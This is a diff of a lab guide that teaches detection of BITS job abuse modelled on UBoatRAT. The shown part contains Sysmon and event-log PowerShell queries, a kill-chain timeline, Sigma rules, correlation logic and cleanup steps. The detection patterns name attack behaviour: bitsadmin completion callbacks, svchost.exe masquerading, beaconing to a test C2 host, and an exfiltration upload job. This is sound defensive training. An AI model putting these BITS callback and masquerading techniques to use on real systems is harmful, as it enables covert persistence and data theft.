-**Step 3 — File creation by svchost.exe (Event ID 11):**
-
-```powershell
-Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
-  Where-Object { $_.Id -eq 11 } |
-  ForEach-Object {
-    $xml  = [xml]$_.ToXml()
-    $data = $xml.Event.EventData.Data
-    [PSCustomObject]@{
-      Time       = $_.TimeCreated
-      Image      = ($data | Where-Object { $_.Name -eq 'Image' }).'#text'
-      TargetFile = ($data | Where-Object { $_.Name -eq 'TargetFilename' }).'#text'
-    }
-  } |
-  Where-Object { $_.Image -like '*svchost*' } |
-  Format-Table -AutoSize -Wrap
-```
-
-Detection signal: files written by `svchost.exe` outside `C:\Windows\SoftwareDistribution\` and `C:\Windows\Temp\`. BITS's legitimate delivery targets are well-known — anything outside them is anomalous.
-
----
-
-### Phase 15: Kill Chain Timeline Reconstruction
-
-Merge all three log sources into a single timeline ordered by timestamp. This reconstructs the complete attack sequence from initial execution to exfiltration as a unified narrative.
-
-```powershell
-$bits = Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
-  Where-Object { $_.Id -in @(3, 59, 60) } |
-  Select-Object TimeCreated,
-    @{N='Source';  E={'BITS-Operational'}},
-    @{N='EventID'; E={$_.Id}},
-    @{N='Detail';  E={($_.Message -split '\r?\n' | Select-Object -First 1)}}
-
-$sysmon = Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
-  Where-Object { $_.Id -in @(1, 3, 11, 13) } |
-  Select-Object TimeCreated,
-    @{N='Source';  E={'Sysmon'}},
-    @{N='EventID'; E={$_.Id}},
-    @{N='Detail';  E={($_.Message -split '\r?\n' | Select-Object -First 1)}}
-
-$security = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 100 |
-  Where-Object { $_.Message -match 'WinSvcHelper|bitsadmin|powershell' } |
-  Select-Object TimeCreated,
-    @{N='Source';  E={'Security-4688'}},
-    @{N='EventID'; E={$_.Id}},
-    @{N='Detail';  E={($_.Message -split '\r?\n' | Select-Object -First 1)}}
-
-($bits + $sysmon + $security) |
   Sort-Object TimeCreated |
-  Format-Table TimeCreated, Source, EventID, Detail -AutoSize -Wrap
+  Format-List TimeCreated, Id, Message
 ```
 
-Map each event in your output to the corresponding kill chain stage:
+Detection opportunities:
 
-| Kill Chain Stage | Expected Event(s) |
-|---|---|
-| Initial Execution | Security 4688 — WinSvcHelper.exe |
-| Execution Chain | Sysmon 1 — powershell.exe child of WinSvcHelper |
-| Persistence Established | Sysmon 13 — Registry write under Schedule key |
-| C2 Channel Opened | BITS 3 — download job created |
-| C2 Pull Initiated | Sysmon 3 — svchost.exe → Ubuntu IP; BITS 59 — transfer started |
-| Payload Delivered | BITS 60 — download complete; Sysmon 11 — file written by svchost.exe |
-| Exfiltration Started | BITS 59 — upload job transfer started |
-| Exfiltration Complete | BITS 60 — upload job completed |
+- job created by `bitsadmin.exe`;
+- `/setnotifycmdline` use;
+- remote URL containing a non-standard port;
+- destination in a user-writable lab path;
+- callback executable in a user-writable directory;
+- suspicious or misleading job names;
+- repeated job errors to an unknown destination.
 
 ---
 
-### Phase 16: Sigma Rules
+## Phase 16 — Sysmon Detection
 
-Sigma is a vendor-neutral detection format that converts to Splunk SPL, Elastic EQL, Microsoft Sentinel KQL, Chronicle YARA-L, and any other SIEM query language via the `sigma-cli` converter. Write two rules: one targeting the BITS Operational log, one targeting process creation.
+### Event ID 1 — Process creation
 
-**Rule 1 — BITS transfer with a non-Microsoft remote URL:**
+Detect:
 
-```yaml
-title: BITS Transfer Job with Non-Microsoft Remote URL
-id: a7f3b2d1-4e8c-4a9f-b61d-2c5e7f9a0b3d
-status: experimental
-description: >
-  Detects BITS transfer jobs where the remote URL does not resolve to Microsoft
-  update infrastructure. Malware including UBoatRAT, StrongPity, and NOBELIUM
-  components use BITS to deliver payloads and exfiltrate data while masking all
-  network activity behind svchost.exe.
-references:
-  - https://attack.mitre.org/techniques/T1197/
-  - https://unit42.paloaltonetworks.com/unit42-uboatrat-navigates-east-asia/
-author: Lab — Detection Engineering Module
-date: 2024-01-01
-tags:
-  - attack.persistence
-  - attack.defense_evasion
-  - attack.command_and_control
-  - attack.exfiltration
-  - attack.t1197
-logsource:
-  product: windows
-  service: bits-client
-detection:
-  selection:
-    EventID: 59
-  filter_microsoft:
-    url|contains:
-      - '.microsoft.com'
-      - '.windowsupdate.com'
-      - '.windows.com'
-      - '.office.com'
-      - '.visualstudio.com'
-      - 'delivery.mp.microsoft.com'
-  filter_empty:
-    url: ''
-  condition: selection and not filter_microsoft and not filter_empty
-fields:
-  - EventID
-  - name
-  - url
-  - localName
-  - bytesTotal
-falsepositives:
-  - Third-party software using BITS for updates — add their domains to filter_microsoft
-  - Software deployment tooling such as SCCM or Intune
-level: medium
+```text
+bitsadmin.exe with /setnotifycmdline
+bitsadmin.exe with /addfile
+runtime\svchost.exe --bits-callback
+svchost.exe outside C:\Windows\
 ```
 
-**Rule 2 — bitsadmin.exe used to register a non-Microsoft remote file:**
+Query:
+
+```powershell
+$ProcessEvents = Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Sysmon/Operational"
+  Id        = 1
+  StartTime = $SessionStart
+}
+
+$ProcessEvents |
+  Where-Object {
+    $_.Message -match (
+      "bitsadmin\.exe|" +
+      "WinSvcHelper\.exe|" +
+      "\\runtime\\svchost\.exe"
+    )
+  } |
+  Sort-Object TimeCreated |
+  Format-List TimeCreated, Message
+```
+
+### Event ID 3 — Network connections
+
+Detect:
+
+```text
+runtime\svchost.exe -> TCP/9001
+svchost.exe -> non-standard HTTP service on TCP/8080
+```
+
+```powershell
+$NetworkEvents = Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Sysmon/Operational"
+  Id        = 3
+  StartTime = $SessionStart
+}
+
+$NetworkEvents |
+  Sort-Object TimeCreated |
+  Format-List TimeCreated, Message
+```
+
+### Event ID 11 — File creation
+
+Detect:
+
+```text
+svchost.exe copied into a user-writable directory
+BITS-delivered file under a desktop lab path
+init.bat and callback artifacts
+```
+
+```powershell
+$FileEvents = Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Sysmon/Operational"
+  Id        = 11
+  StartTime = $SessionStart
+}
+
+$FileEvents |
+  Sort-Object TimeCreated |
+  Format-List TimeCreated, Message
+```
+
+### Event ID 22 — DNS query
+
+The configuration attempts to record:
+
+```text
+uboat-c2.test
+```
+
+However, the hostname is resolved through the Windows `hosts` file. Depending on the Windows and Sysmon build, a DNS event may not be generated.
+
+Treat Event ID 22 as useful corroboration, not a mandatory success condition.
+
+---
+
+## Phase 17 — Security Event ID 4688
+
+Query relevant process creation events:
+
+```powershell
+Get-WinEvent -FilterHashtable @{
+  LogName   = "Security"
+  Id        = 4688
+  StartTime = $SessionStart
+} |
+  Where-Object {
+    $_.Message -match (
+      "WinSvcHelper\.exe|" +
+      "bitsadmin\.exe|" +
+      "\\runtime\\svchost\.exe|" +
+      "\\runtime\\init\.bat"
+    )
+  } |
+  Sort-Object TimeCreated |
+  Format-List TimeCreated, Message
+```
+
+Use Security 4688 to corroborate:
+
+- original execution;
+- command line;
+- account;
+- creator process;
+- callback executable path.
+
+---
+
+## Phase 18 — Timeline Reconstruction
+
+Create a combined timeline:
+
+```powershell
+$BitsTimeline = Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Bits-Client/Operational"
+  StartTime = $SessionStart
+} |
+  Where-Object {
+    $_.Message -match "UBoatLab_"
+  } |
+  Select-Object TimeCreated,
+    @{Name="Source"; Expression={"BITS"}},
+    @{Name="EventId"; Expression={$_.Id}},
+    @{Name="Detail"; Expression={
+      ($_.Message -split "\r?\n" |
+        Select-Object -First 2) -join " | "
+    }}
+
+$SysmonTimeline = Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Sysmon/Operational"
+  StartTime = $SessionStart
+} |
+  Where-Object {
+    $_.Id -in @(1, 3, 11, 22)
+  } |
+  Where-Object {
+    $_.Message -match (
+      "UBoatRAT|" +
+      "WinSvcHelper|" +
+      "UBoatLab_|" +
+      "\\runtime\\svchost\.exe|" +
+      "uboat-c2\.test"
+    )
+  } |
+  Select-Object TimeCreated,
+    @{Name="Source"; Expression={"Sysmon"}},
+    @{Name="EventId"; Expression={$_.Id}},
+    @{Name="Detail"; Expression={
+      ($_.Message -split "\r?\n" |
+        Select-Object -First 2) -join " | "
+    }}
+
+$SecurityTimeline = Get-WinEvent -FilterHashtable @{
+  LogName   = "Security"
+  Id        = 4688
+  StartTime = $SessionStart
+} |
+  Where-Object {
+    $_.Message -match (
+      "WinSvcHelper|" +
+      "bitsadmin|" +
+      "\\runtime\\svchost\.exe"
+    )
+  } |
+  Select-Object TimeCreated,
+    @{Name="Source"; Expression={"Security"}},
+    @{Name="EventId"; Expression={$_.Id}},
+    @{Name="Detail"; Expression={
+      ($_.Message -split "\r?\n" |
+        Select-Object -First 2) -join " | "
+    }}
+
+($BitsTimeline + $SysmonTimeline + $SecurityTimeline) |
+  Sort-Object TimeCreated |
+  Format-Table TimeCreated, Source, EventId, Detail `
+    -AutoSize `
+    -Wrap
+```
+
+Map the events to:
+
+| Stage | Expected evidence |
+|---|---|
+| Initial execution | Security 4688 and Sysmon 1 for `WinSvcHelper.exe` |
+| Runtime staging | Sysmon 11 for files under `runtime` |
+| BITS setup | Sysmon 1 and Security 4688 for `bitsadmin.exe` |
+| Transfer | BITS Operational plus network traffic to TCP/8080 |
+| Callback | Sysmon 1 for `runtime\svchost.exe --bits-callback` |
+| Resolver retrieval | HTTP `/resolver/README.md` and Sysmon network telemetry |
+| Beacon | Sysmon 3 and PCAP for TCP/9001 |
+| Server validation | Ubuntu `server.log` and `beacon.log` |
+
+<!-- SCREENSHOT PLACEHOLDER:
+Combined timeline output showing the full ordered chain.
+-->
+
+---
+
+## Phase 19 — Sigma Rules
+
+### Rule 1 — BITSAdmin registers a notification command
 
 ```yaml
-title: BITSAdmin Invoked to Add Remote File with Non-Microsoft URL
-id: c9e1a0f2-7b3d-4c8e-a5f6-1d2b3c4e5f6a
+title: BITSAdmin Registers a Completion Command
+id: 9cf728d7-1a40-4b8e-a731-d32b67f1c126
 status: experimental
 description: >
-  Detects bitsadmin.exe invoked with the /addfile switch and a remote URL not
-  belonging to Microsoft's distribution infrastructure. Though deprecated in
-  favour of PowerShell, bitsadmin ships on all current Windows builds and
-  appears in documented malware toolchains for BITS-based C2 and exfiltration.
+  Detects bitsadmin.exe registering a command to execute through
+  SetNotifyCmdLine. This behavior can chain a BITS transfer into
+  post-transfer execution.
 references:
   - https://attack.mitre.org/techniques/T1197/
-author: Lab — Detection Engineering Module
-date: 2024-01-01
+author: UBoatRAT Behavior Lab
+date: 2026-07-21
 tags:
   - attack.defense_evasion
   - attack.persistence
@@ -886,103 +1681,225 @@ logsource:
 detection:
   selection:
     Image|endswith: '\bitsadmin.exe'
-    CommandLine|contains: '/addfile'
-  filter_microsoft:
-    CommandLine|contains:
-      - '.microsoft.com'
-      - '.windowsupdate.com'
-      - '.office.com'
-  condition: selection and not filter_microsoft
+    CommandLine|contains: '/setnotifycmdline'
+  condition: selection
 fields:
   - Image
   - CommandLine
   - ParentImage
   - User
 falsepositives:
-  - Legitimate administrative use of bitsadmin for internal software deployment
+  - Rare legitimate administrative BITS workflows
+  - Internal deployment tooling using bitsadmin callbacks
 level: high
 ```
 
-**Step 1 — Identify false positive gaps:**
+### Rule 2 — `svchost.exe` outside Windows directories
 
-Looking at Rule 1: what URL patterns specific to your environment's third-party software vendors would you need to add to `filter_microsoft`? List three candidates.
-
-**Step 2 — Multi-signal SIEM correlation:**
-
-A single-indicator rule produces noise in any active environment. The following compound logic, evaluated across all events from the same host within a five-minute window, reduces false positives to near zero while preserving high-confidence detection:
-
+```yaml
+title: Svchost Executed Outside Windows Directories
+id: 87cc37e4-3591-4bf8-831d-e0c750805c67
+status: experimental
+description: >
+  Detects an executable named svchost.exe launched from outside expected
+  Windows system directories. Malware and simulators may use this name
+  to masquerade as a trusted service host.
+references:
+  - https://attack.mitre.org/techniques/T1036/
+author: UBoatRAT Behavior Lab
+date: 2026-07-21
+tags:
+  - attack.defense_evasion
+  - attack.t1036
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\svchost.exe'
+  filter_system32:
+    Image|startswith:
+      - 'C:\Windows\System32\'
+      - 'C:\Windows\SysWOW64\'
+  condition: selection and not filter_system32
+fields:
+  - Image
+  - CommandLine
+  - ParentImage
+  - User
+falsepositives:
+  - Testing tools deliberately using a system-like filename
+  - Software packaged with a file named svchost.exe
+level: high
 ```
-IF on the same host within 5 minutes:
-  (1) bitsadmin.exe executed                             [Sysmon Event 1]
-  AND (2) BITS job started with non-Microsoft URL        [BITS Operational Event 59]
-  AND (3) svchost.exe connected to the same IP as (2)   [Sysmon Event 3]
-  AND (4) File written outside SoftwareDistribution\    [Sysmon Event 11]
-THEN: HIGH CONFIDENCE — T1197 BITS Abuse
-```
 
-Each signal alone could fire on legitimate administrative activity. All four together, on the same host, within five minutes, are operationally unambiguous. This is exactly the chain of events you reconstructed manually in Phase 15 — now expressed as an automated correlation rule.
+### Rule 3 — User-writable `svchost.exe` connects to an unusual port
+
+```yaml
+title: User-Writable Svchost Network Connection
+id: 7a0dbdd0-967d-4ddf-b511-e9633011b84e
+status: experimental
+description: >
+  Detects an executable named svchost.exe outside Windows system paths
+  initiating a network connection. The lab simulator connects to a fixed
+  private TCP listener on port 9001.
+author: UBoatRAT Behavior Lab
+date: 2026-07-21
+tags:
+  - attack.command_and_control
+  - attack.defense_evasion
+  - attack.t1036
+logsource:
+  product: windows
+  category: network_connection
+detection:
+  selection:
+    Image|endswith: '\svchost.exe'
+  selection_port:
+    DestinationPort: 9001
+  filter_system32:
+    Image|startswith:
+      - 'C:\Windows\System32\'
+      - 'C:\Windows\SysWOW64\'
+  condition: selection and selection_port and not filter_system32
+fields:
+  - Image
+  - DestinationIp
+  - DestinationHostname
+  - DestinationPort
+  - User
+falsepositives:
+  - Controlled security testing
+level: high
+```
 
 ---
 
-### Cleanup
+## Phase 20 — Multi-Signal Correlation
 
-Remove all artefacts and return the endpoint to its baseline state.
+A strong production detection should correlate independent signals on the same host.
 
-**Ubuntu:**
+```text
+Within five minutes on the same endpoint:
 
-```bash
-# Press CTRL+C in the Ubuntu terminal to stop the web server
+1. bitsadmin.exe executes with /setnotifycmdline
+2. a BITS job references an unusual URL or non-standard port
+3. svchost.exe executes outside C:\Windows\
+4. that executable connects to the resolver or beacon endpoint
+5. files are created under the same user-writable runtime directory
+
+Result:
+High-confidence BITS callback abuse with masquerading and network activity
 ```
 
-**Windows — Administrator PowerShell:**
+Explain why each individual signal may produce false positives and why the full sequence is substantially stronger.
+
+---
+
+# Session Cleanup
+
+## Student workflow
+
+Stop the Ubuntu server with:
+
+```text
+CTRL+C
+```
+
+Close the lab session.
+
+The platform reverts both VMs to the shared snapshot. This is the authoritative cleanup mechanism.
+
+Do not remove all BITS jobs from the shared VM indiscriminately.
+
+## Author dry-run cleanup without snapshot revert
+
+Use this only while developing or validating the lab.
+
+Remove only UBoatRAT-specific jobs:
 
 ```powershell
-# Cancel any remaining BITS jobs
-Get-BitsTransfer -AllUsers | Remove-BitsTransfer
+Import-Module BitsTransfer
 
-# Remove all downloaded and created files from the lab
-@(
-  "C:\Users\Public\implant.dat",
-  "C:\Users\Public\config.dat",
-  "C:\Users\Public\beacon.dat",
-  "C:\Users\Public\sensitive.txt",
-  "C:\Users\Public\bits_callback.log",
-  "C:\ProgramData\beacon.dat",
-  "C:\ProgramData\next_stage.dat"
-) | ForEach-Object {
-  Remove-Item $_ -Force -ErrorAction SilentlyContinue
-}
+$LabJobNames = @(
+  "UBoatLab_Persistence",
+  "UBoatLab_ManualDownload",
+  "UBoatLab_ManualCallback"
+)
 
-# Remove the scheduled task created by the simulation
-# (Adjust the task name if your setup script uses a different one)
-Unregister-ScheduledTask -TaskName "Windows_Update_Helper" -Confirm:$false -ErrorAction SilentlyContinue
-
-# Verify BITS queue is completely empty
-bitsadmin /list /allusers
-
-# Verify no stray .dat files remain under ProgramData
-Get-ChildItem "C:\ProgramData\" -Filter "*.dat" -ErrorAction SilentlyContinue |
-  Select-Object Name, FullName
+Get-BitsTransfer -AllUsers |
+  Where-Object {
+    $_.DisplayName -in $LabJobNames
+  } |
+  Remove-BitsTransfer
 ```
 
-Close all tool windows — Procmon, Wireshark, Process Explorer, and Event Viewer.
+Remove only lab-generated runtime state:
+
+```powershell
+Remove-Item `
+  "C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime" `
+  -Recurse `
+  -Force `
+  -ErrorAction SilentlyContinue
+
+Remove-Item `
+  "C:\Users\Administrator\Desktop\Labs\UBoatRAT\UBoatRAT_Lab_Blocked.log" `
+  -Force `
+  -ErrorAction SilentlyContinue
+```
+
+Do not remove other laboratories' artifacts, jobs, tools, or shared telemetry configuration.
 
 ---
 
-### Conclusion
+# Conclusion
 
-In this lab you worked through the same technique from three perspectives that mirror the division of labour inside a real security organisation.
+In this lab, you investigated a windowless executable and reconstructed a complete behavioral chain from independent evidence.
 
-As a **malware analyst**, you received a file with no prior knowledge of its purpose. Working across Procmon, Wireshark, Process Explorer, and the BITS Operational log, you reconstructed the complete behavioral picture: which process ran, what it spawned, what it wrote to disk, how it established persistence, which Windows service it co-opted for network transfers, and what data left the machine. You reached the conclusion — BITS abuse for C2 and exfiltration — through evidence, not by being told.
+As a malware analyst, you identified:
 
-As a **red team operator**, you reproduced every component of that mechanism with full intentionality. You now understand what each BITS job type does at the protocol level, how the BITS service manages job lifecycle from creation through completion, why `svchost.exe` attribution makes this traffic blend into ordinary Windows Update noise, and how the callback execution mechanism chains a download directly into silent post-transfer execution without leaving an additional persistence artefact.
+- local staging under a user-writable runtime directory;
+- execution of `bitsadmin.exe`;
+- creation of a BITS download job;
+- registration of a completion callback;
+- execution of a misleadingly named `svchost.exe`;
+- retrieval and decoding of a dead-drop resolver;
+- transmission of one fixed XOR-encoded beacon.
 
-As a **detection engineer**, you built layered coverage across three log sources, wrote two production-ready Sigma rules targeting both the BITS Operational log and process creation telemetry, and expressed the complete attack chain as a compound SIEM correlation that a SOC analyst can deploy and tune. The multi-signal model demonstrates why single-indicator alerting produces noise while compound correlation produces actionable detections.
+As a red team operator, you reproduced:
 
-The technique — T1197 BITS Jobs — is not exotic or rare. It has appeared in campaigns attributed to UBoatRAT (2017), StrongPity (2021), and NOBELIUM (2021). The BITS Operational log, Sysmon, and the two Sigma rules you built today generalise across all of them.
+- a BITS download;
+- BITS callback execution;
+- Base64 endpoint decoding;
+- the fixed XOR encoding;
+- a one-way TCP beacon with no command response.
 
-<br></br>
+As a detection engineer, you correlated:
+
+- BITS Operational events;
+- Sysmon process, network, file, and optional DNS telemetry;
+- Security Event ID 4688;
+- Procmon evidence;
+- packet capture;
+- Ubuntu server logs.
+
+The key lesson is not that one Windows binary or one port is inherently malicious. The detection value comes from the sequence:
+
+```text
+BITS job
+→ notification command
+→ system-like executable in a user-writable path
+→ dead-drop endpoint resolution
+→ unusual outbound connection
+```
+
+That sequence is observable, explainable, and suitable for layered detection.
+
+<br>
 
 # Finished?
 
-[Back to Card's Main Page](../Backround_Intelligent_Transfer_Service_As_Exfil.md)****
+[Back to Card's Main Page](../Backround_Intelligent_Transfer_Service_As_Exfil.md)
+
+
